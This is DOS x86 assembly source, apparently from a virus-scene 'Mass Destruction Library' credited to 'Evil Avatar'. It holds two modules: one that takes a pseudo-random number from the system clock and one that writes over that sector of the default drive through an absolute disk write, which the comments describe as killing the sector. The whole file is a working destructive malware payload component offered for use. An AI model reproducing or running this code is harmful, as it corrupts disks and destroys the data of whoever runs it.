

;POT_SHOT - module for Mass Destruction Library
;written by Evil Avatar
; Destruye un sector al azar del drive default

        call rnd_num
pot_shot:
        push cx
        push dx               ;save regs that will be changed
        push ax               ;save sector number
        mov ax, 0dh
        int 21h               ;reset disk
        mov ah, 19h
        int 21h               ;get default disk
        pop dx                ;put sector number in dx
        mov cx, 1
        int 26h               ;kill sector
        pop dx
        pop cx
        ret                   ;restore sectors and return

;RND_NUM - module for Mass Destruction Library
;written by Evil Avatar

rnd_num:
        push cx
        push dx               ;save regs that will be changed
        xor ax, ax
        int 1ah               ;get system time
        xchg dx, ax           ;put lower word into ax
        pop dx
        pop cx
        ret                   ;restore regs and return

